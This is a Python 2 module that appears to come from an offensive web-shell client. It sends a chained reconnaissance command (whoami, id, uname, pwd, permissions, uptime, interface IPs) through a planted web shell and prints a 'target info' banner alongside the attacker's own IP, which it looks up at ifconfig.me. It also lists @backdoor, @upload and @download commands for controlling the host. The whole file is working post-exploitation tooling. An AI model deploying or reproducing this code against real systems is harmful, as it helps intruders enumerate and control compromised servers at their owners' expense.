import datetime
from urllib2 import urlopen, URLError

from core.libs.menu import Colors, getargs
from core.libs.request_handler import make_request


class TargetBox(object):
    def __init__(self, url=None):
        self.url = url
        self.cmd = 'whoami;'
        self.cmd += 'id;'
        self.cmd += 'uname -a;'
        self.cmd += 'pwd;'
        self.cmd += 'ls -ld `pwd` | awk \'{print $1}\';'
        self.cmd += 'bash -c "input=\$(uptime); if [[ \$input == *day* ]]; then out=\$(echo \$input | awk \'{print \$3\\" days\\"}\'); if [[ \$input == *min* ]]; then out=\$(echo \\"\$out and \\" && echo \$input | awk \'{print \$5\\" minutes\\"}\'); else out=\$(echo \\"\$out, \\" && echo \$input | awk \'{print \$5}\' | tr -d \\",\\" | awk -F \\":\\" \'{print \$1\\" hours and \\"\$2\\" minutes\\"}\'); fi elif [[ \$input == *min* ]]; then out=\$(echo \$input | awk \'{print \$3\\" minutes\\"}\'); else out=\$(echo \$input | awk \'{print \$3}\' | tr -d \\",\\" | awk -F \\":\\" \'{print \$1\\" hours and \\"\$2\\" minutes\\"}\'); fi; echo \$out;" ;'
        self.cmd += "/sbin/ifconfig | grep -e 'inet addr' | grep -v '127.0.0.1' | cut -f2 -d':' | cut -f1 -d' ';"

        self.available_commands = ['@backdoor', '@download', '@enum', '@history', '@info', '@update', '@upload', 'clear', 'exit']

    def get_information(self):
        now = datetime.datetime.now()

        # Call get_page_source() method then assign it to self.source
        source = make_request.get_page_source(self.cmd)

        def get(seq, index, default='Unknown'):
            try:
                return seq[index]
            except:
                return default

        self.current_user = get(source, 0)
        self.current_id = get(source, 1)
        self.kernel_info = get(source, 2)
        self.cwd = get(source, 3)
        self.perm_cwd = get(source, 4)
        self.uptime = get(source, 5)
        self.host_ip = get(source, 6)
        self.session = now.strftime("%Y-%m-%d")
        self.url = '/'.join(getargs.url.split('/', 3)[:3])
        try:
            # Get the attacker's ip address (Thanks @mandreko)
            self.local_ip = (urlopen('http://ifconfig.me/ip').read()).strip()
        except URLError:
            self.local_ip = 'Unknown'

        self.info = \
        '''
        {dashed}
        {red}User{end}        :  {green}{current_user}{end}
        {red}ID{end}          :  {green}{current_id}{end}
        {red}Kernel{end}      :  {green}{kernel_info}{end}
        {red}CWD{end}         :  {green}{cwd}{end}\t\t{hot}{perm_cwd}{end}
        {red}Uptime{end}      :  {green}{uptime}{end}
        {red}Target's IPs{end}:  {green}{host_ip}{end}
        {red}Our IP{end}      :  {green}{local_ip}{end}
        {dashed}

        {hot}[+] Available commands: {available_commands}{end}
        {hot}[+] Inserting{end} {red}!{end} {hot}at the begining of the command will execute the command locally ({red}on your box{end}){end}
        '''.format(
                dashed='-' * int(len(self.kernel_info) + 16),
                red=Colors.RED, green=Colors.GREEN, hot=Colors.HOT,
                current_user=self.current_user,
                current_id=self.current_id,
                kernel_info=self.kernel_info,
                cwd=self.cwd,
                perm_cwd=self.perm_cwd,
                host_ip=self.host_ip,
                local_ip=self.local_ip,
                uptime=self.uptime,
                available_commands=self.available_commands,
                end=Colors.END,)
        print self.info

info = TargetBox()
